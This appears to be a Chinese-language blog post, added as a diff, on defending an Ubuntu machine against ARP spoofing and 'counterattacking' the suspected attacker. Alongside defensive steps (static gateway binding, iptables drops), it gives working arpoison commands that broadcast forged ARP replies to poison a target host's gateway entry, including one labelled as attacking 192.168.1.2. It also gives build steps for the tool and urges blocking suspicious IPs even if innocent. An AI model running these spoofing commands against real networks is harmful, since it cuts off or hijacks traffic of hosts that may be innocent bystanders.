@@ -1,0 +1,158 @@
+---
+layout: post
+title: ubuntu反击ARP
+---
+<hr>
+假设网关IP 192.168.1.1   MAC 40:16:9f:e1:ab:80
+假设可疑IP 192.168.1.131
+
+
+
+1 创建脚本开机自动防守
+<textarea cols="100" rows="3">
+sudo touch /etc/arp_fanshou
+sudo chmod +x /etc/arp_fangzhou
+sudo sed '$a\/etc/arp_fanshou' -i /etc/init.d/rc.local
+</textarea>
+
+脚本内容如下：
+<textarea cols="100" rows="10">
+#!/bin/bash
+
+#绑定网关
+arp -s 192.168.1.1 40:16:9f:e1:ab:80
+
+#禁止ping入
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+#阻止这个IP连接本机
+iptables -t filter -A INPUT -s 192.168.1.131 -i eth0 -j DROP
+
+#防止DOS攻击
+iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
+</textarea>
+
+2 创建脚本反击
+<textarea cols="100" rows="1">
+sudo touch /etc/arp_fanji && sudo chmod +x /etc/arp_fanji</textarea>
+<textarea cols="100" rows="1">
+#!/bin/bash
+arpoison -i eth0 -d 192.168.1.131 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 11:11:11:11:11:11
+</textarea>
+
+
+
+ 
+
+ 
+
+ 
+
+————————————————————————————————
+
+以下是网上搜索到的分解操作
+
+————————————————————————————————
+
+ 
+
+防守：
+
+绑定网关MAC：sudo arp -s 网关IP 网关MAC
+
+禁止ping入:sudo echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+阻止可疑IP连接本机：sudo iptables -t filter -A INPUT -s 可疑IP -i eth0 -j DROP 
+
+可疑IP：有可能是攻击者本机，也可能是被攻击者设为代理的主机，宁可错杀！
+
+————————————————————————————————
+
+ 反击：
+
+sudo arpoison -i 接口 -d 目标IP -s 源IP -t 目标网关MAC -r 源MAC -n 次数
+
+示例：告诉网关本机真实MAC 10次
+
+arpoison -i eth0 -d 网关IP -s 本机IP -t 网关MAC -r 本机MAC -n 10
+
+示例：防止arp 攻击
+
+sudo arpoison -i eth0 -d 网关IP -s 本机IP -t ff:ff:ff:ff:ff:ff -r 本机MAC
+
+示例：攻击192.168.1.2
+
+sudo arpoison -i eth0 -d 192.168.1.2 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 错误的MAC   
+
+————————————————————————————————
+
+安装方法：
+ 
+
+参照：http://hi.baidu.com/yk103/blog/item/f39e253f9d6aeeed55e72361.html/cmtid/912acdeae74294dbd439c951
+
+下载：http://www.arpoison.net/arpoison-0.6.tar.gz
+
+准备：sudo apt-get install libnet1-dev
+
+安装：
+
+tar -xvzf arpoison-0.6.tar.gz
+
+cd arpoison
+
+gcc arpoison.c /usr/lib/libnet.a -o arpoison 
+
+mv arpoison /usr/sbin
+
+————————————————————————————————
+
+ 
+
+绑定网关
+
+查看网关IP和MAC：arp -nv
+
+假设网关IP 192.168.1.1   MAC 40:16:9f:e1:ab:80
+
+临时绑定：sudo arp -s 192.168.1.1 40:16:9f:e1:ab:80
+
+ 
+
+自动绑定：
+
+sudo bash
+
+echo '192.168.1.1 40:16:9f:e1:ab:80' > /etc/ethers
+
+echo ‘arp -f /etc/ethers’>>/etc/init.d/rc.local
+
+或（其实随便起个文件名都可以，关键是把命令添加到启动脚本）
+
+echo '192.168.1.1 40:16:9f:e1:ab:80' > /etc/ip-mac 
+
+echo ‘arp -f /etc/ip-mac’>>/etc/init.d/rc.local
+
+ 
+
+ 
+
+————————————————————————————————
+
+反击示例
+
+假设网关           192.168.1.1            40:16:9f:e1:ab:80
+
+假设本机           192.168.1.146        00:17:31:85:9d:08
+
+假设可疑主机    192.168.131           54:42:49:5d:d5:b1
+
+sudo -i
+
+arp -s 192.168.1.1            40:16:9f:e1:ab:80
+
+echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
+
+iptables -t filter -A INPUT -s 192.168.1.131 -i eth0 -j DROP
+
+arpoison -i eth0 -d 192.168.1.131 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 11:11:11:11:11:11
